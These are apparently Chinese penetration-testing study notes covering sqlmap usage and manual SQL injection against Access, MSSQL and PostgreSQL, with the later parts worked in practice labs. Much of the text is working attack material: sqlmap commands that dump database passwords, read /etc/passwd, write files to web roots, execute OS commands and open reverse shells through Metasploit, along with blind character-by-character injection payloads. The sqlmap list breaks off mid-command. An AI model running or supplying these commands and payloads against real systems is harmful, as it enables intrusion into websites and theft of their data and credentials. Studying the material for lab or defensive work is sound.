# 1、sqlmap使用

![1344396-20180717215927537-734614556.png](https://s2.loli.net/2022/11/25/NO4KTFgb7tQMIE8.png)



```sql
基本操作笔记：-u  #注入点 

-f  #指纹判别数据库类型 
-b  #获取数据库版本信息 
-p  #指定可测试的参数(?page=1&id=2 -p "page,id") 
-D ""  #指定数据库名 
-T ""  #指定表名 
-C ""  #指定字段 
-s ""  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s "xx.log"　　恢复:-s "xx.log" --resume) 
--level=(1-5) #要执行的测试水平等级，默认为1 
--risk=(0-3)  #测试执行的风险等级，默认为1 
--time-sec=(2,5) #延迟响应，默认为5 
--data #通过POST发送数据 
--columns        #列出字段 
--current-user   #获取当前用户名称 
--current-db     #获取当前数据库名称 
--users          #列数据库所有用户 
--passwords      #数据库用户所有密码 
--privileges     #查看用户权限(--privileges -U root) 
-U               #指定数据库用户 
--dbs            #列出所有数据库 
--tables -D ""   #列出指定数据库中的表 
--columns -T "user" -D "mysql"      #列出mysql数据库中的user表的所有字段 
--dump-all            #列出所有数据库所有表 
--exclude-sysdbs      #只列出用户自己新建的数据库和表 
--dump -T "" -D "" -C ""   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) 
--dump -T "" -D "" --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 
--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) 
--os      #指定系统(Linux,Windows) 
-v  #详细的等级(0-6) 
    0：只显示Python的回溯，错误和关键消息。 
    1：显示信息和警告消息。 
    2：显示调试消息。 
    3：有效载荷注入。 
    4：显示HTTP请求。 
    5：显示HTTP响应头。 
    6：显示HTTP响应页面的内容 
--privileges  #查看权限 
--is-dba      #是否是数据库管理员 
--roles       #枚举数据库用户角色 
--udf-inject  #导入用户自定义函数（获取系统权限） 
--union-check  #是否支持union 注入 
--union-cols #union 查询表记录 
--union-test #union 语句测试 
--union-use  #采用union 注入 
--union-tech orderby #union配合order by 
--data "" #POST方式提交数据(--data "page=1&id=2") 
--cookie "用;号分开"      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) 
--referer ""     #使用referer欺骗(--referer "http://www.baidu.com") 
--user-agent ""  #自定义user-agent 
--proxy "http://127.0.0.1:8118" #代理注入 
--string=""    #指定关键词,字符串匹配. 
--threads 　　  #采用多线程(--threads 3) 
--sql-shell    #执行指定sql命令 
--sql-query    #执行指定的sql语句(--sql-query "SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1" ) 
--file-read    #读取指定文件 
--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) 
--file-dest    #要写入的文件绝对路径 
--os-cmd=id    #执行系统命令 
--os-shell     #系统交互shell 
--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) 
--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) 
--os-smbrelay  # 
--os-bof       # 
--reg-read     #读取win系统注册表 
--priv-esc     # 
--time-sec=    #延迟设置 默认--time-sec=5 为5秒 
-p "user-agent" --user-agent "sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)"  #指定user-agent注入 
--eta          #盲注 
/pentest/database/sqlmap/txt/
common-columns.txt　　字段字典　　　 
common-outputs.txt 
common-tables.txt      表字典 
keywords.txt 
oracle-default-passwords.txt 
user-agents.txt 
wordlist.txt 

常用语句 :
1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 
2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 
3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 
4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C "user,pass"  -v 1 --exclude-sysdbs 
5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 
6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read "c:\boot.ini" -v 2 
7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 
8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd "id" -v 1 
9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 
10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 
11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 
12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 
13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key="HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1 
14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta 
15./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "')" --suffix "AND ('abc'='abc"
16./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass"
17./sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"
18./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 
19./sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo'" -v 1 
20./sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --common-tables -D testdb --banner 
21./sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --cookie="PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low" --string='xx' --dbs --level=3 -p "uid"

简单的注入流程 :
1.读取数据库版本，当前用户，当前数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 
2.判断当前数据库用户权限 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 
3.读取所有数据库用户或指定数据库用户的密码 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 
4.获取所有数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 
5.获取指定数据库中的所有表 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 
6.获取指定数据库名中指定表的字段 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 
7.获取指定数据库名中指定表中指定字段的数据 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C "username,password" -s "sqlnmapdb.log" -v 2 
8.file-read读取web文件 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read "/etc/passwd" -v 2 
9.file-write写入文件到web 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：
```





# 2、Access注入

Access数据库的组成（相比于MySQL等数据库，Access数据库没有数据库这一层，相当于每个网站的数据库都是独立的，没有跨库注入，只能暴力破解）：

```
Access数据库：
	表名：
		列名：
			数据：
			
MySQL数据库：
	数据库名：
		表名：
			列名:
				数据：
```

access 数据库都是存放在网站目录下，后缀格式为 mdb，accdb等可以通过一些暴库手段、目录猜解等直接下载数据库，



```
access无法使用： union select 1,2,3,4格式，

必须指定要从哪个表中查询，例如：union select 1,2,3 from user
```

**access三大攻击手法**

```bash
1.access注入攻击片段-联合查询法
2.access注入攻击片段-逐字猜解法
3.工具类的使用注入（推荐）
```

**Access注入攻击方式**

主要有：union 注入、http header 注入、偏移注入等



## EXISTS 运算符

EXISTS 运算符用于判断查询子句是否有记录，如果有一条或多条记录存在返回 **True**，否则返回 False。

### SQL EXISTS 语法

```sql
SELECT column_name(s)
FROM table_name
WHERE EXISTS
(SELECT column_name FROM table_name WHERE condition);
```



## Access数据库中的函数 

```
select len("string")        查询给定字符串的长度
select asc("a")             查询给定字符串的ascii值
top  n                      查询前n条记录
select mid("string",2,1)    查询给定字符串从指定索引开始的长度
```



    mid(string,start,length) 这个用来截取字符串的
    string是要截取的字符串
    start是截取的字符串开始索引
    length是要截取的字符串长度 




## 2.1 **盲注Access数据库** 

Access数据库特有的表是：**msysobjects**  ，所以可以用它来判断是否是Access数据库

```
exists(select * from msysobjects)  #如果这条语句正确，说明是Access数据库
```

Access没有数据库的概念，所有的表都是在同一个数据库下。所以，我们不用去判断当前的数据库名，并且access数据库中也不存在 database() 函数。



对于判断存在哪些表，只能用以下枚举的方法来猜测是否存在某某表。 

判断存在sql注入后，判断是否存在admin表，如果存在，正常查询，如果不存在，报语法错误。然后通过**枚举表名爆破**

```
and exists(select* from  admin)
```



猜测字段也是一样，只能通过枚举来猜测 

判断有admin表后，再**判断admin表有多少列**，假如1-10正常查询，11列报语法报错，那说明有10列

```
and exists(select * from admin order by 10)
```



判断出存在的列数后，再**判断具体的列名**。以下语句判断是否存在name列，如果存在，正常查询，如果不存在，则报语法错误。然后再通过枚举列名爆破

```
and exists(select name from admin)
```



猜测完表名和字段名后，我们就看看这个**表里面有多少行数据** ，如果>99查询正确，>100查询错误(这里是查询错误，而不是语法错误)，说明有100行数据

```
and (select count(*) from information)>100
```



然后在猜测每个字段具体的数据了 

access数据库中没有 limit，就不能限制查询出来的行数。但是我们可以使用top命令，top 1是将查询的所有数据只显示第一行，所以 top3就是显示查询出来的前三行数据了

```
猜测admin列的第一个数据的长度，如果大于5查询不出数据，大于4正常，说明admin列的第一个数据长度是5
and (select top 1 len(admin)from admin)>5

猜测admin列的第一行数据的第一个字符的ascii码值，如果大于97查询不出数据，大于96正常，说明admin列的第一行数据的第一个字符的ascii值是97
and (select top 1 asc(mid(admin,1,1))from admin)>97 
第一行数据的第二个字符
and (select top 1 asc(mid(admin,2,1))from admin)>97 

从第二行开始，查询数据就得用另外的语句了,因为这里的top只能显示查询前几条数据，所以我们得用联合查询，先查询前两条，然后倒序，然后在找出第一条，这就是第二条数据。
查询第二行admin列的长度
and (select top 1 len(admin)  from ( select top 2 * from information order by id)  order by id desc)>55
下面是查询第2条数据的第3个字符
and (select top 1 asc(mid(admin,3,1))  from ( select top 2 * from information order by id)  order by id desc)>55
查询第三条数据的第4个字符
and (select top 1 asc(mid(admin,4,1))  from ( select top 3 * from information order by id)  order by id desc)>55
```

注：在access中，中文也可以用**asc函数**来表示，

例如：asc(mid("中国",1)) 表示 中 字的ascii值，可以用 **chr** （将ascll码变为对应值）来逆向得出值

```
asc("中") = -10544
chr(-10544) = 中
```

​	

## 2.2 Sqlmap注入Access数据库
爆出access数据库存在的表，只能利用枚举的方式爆破。

```
sqlmap -u "xxx"  --tables
```


第一步问我们是否使用公共的库去爆破，我们选择：Y；

第二步选择默认的库文件：1 

第三步选择线程数：10



可以看出爆出了两个数据表：admin 、 specialty

爆出admin数据库中的列名

```
sqlmap -u "xxx" -T admin --columns
```


意思和上一步也是一样的。 



爆出admin表下username列的所有数据

```
sqlmap -u "xxx" -T admin -C username --dump-all
```





# 3 sqlSever数据库 注入（msSQL）
参考链接：

https://www.cnblogs.com/xishaonian/p/6173644.html


![image-20221112195346808](https://s2.loli.net/2022/11/25/8MBGvgPzr6Wo7km.png)



## 3.1 墨者靶场sqlsever

<img src="https://s2.loli.net/2022/11/25/S7AUP1OGpJYmLeq.png" alt="image-20221112200120511" style="zoom:33%;" />

1、判断数据库类型：

![image-20221112200210487](https://s2.loli.net/2022/11/25/Nx6P1ojrEJTtYev.png)

如果是mssql就正常显示



2、判断数据库版本

![image-20221112200300428](https://s2.loli.net/2022/11/25/wuzMGsHp3JNjBQI.png)

```
and substring((select @@version),22,4)='2005'--
```

适用于无回显模式，后面的2005就是数据库版本，返回正常就是2005的复制代码第一条语句执行

如果是2005版就有回显





# 4、postgreSQL

链接：

https://www.cnblogs.com/yilishazi/p/14710349.html



常见函数（整体）：

```
SELECT version() #查看版本信息
#查看用户
SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user;#这里是usename不是username
SELECT getpgusername();
#查看当前数据库
SELECT current_database()10 CURRENT_SCHEMA()  查看当前数据库    sqlmap跑注入使用此函数。
```



## 4.1 墨者postgresql

<img src="https://s2.loli.net/2022/11/25/k41DJPl2sHA5Qoe.png" alt="image-20221112210842964" style="zoom:33%;" />



**首先查询字段数：**

```
order by 4
```

猜出有四个四段



**看回显**

```
union select '1','2','3','4'
```

注意要打逗号，

![image-20221112211058412](https://s2.loli.net/2022/11/25/UxPYyoum7aj5LCG.png)

![image-20221112211110862](https://s2.loli.net/2022/11/25/jAMw562xRLhUN4y.png)





**爆库**

```
 union select '1',(select current_database()),'3','4' 
```

![image-20221112211220684](https://s2.loli.net/2022/11/25/654fWjrh3H78zdG.png)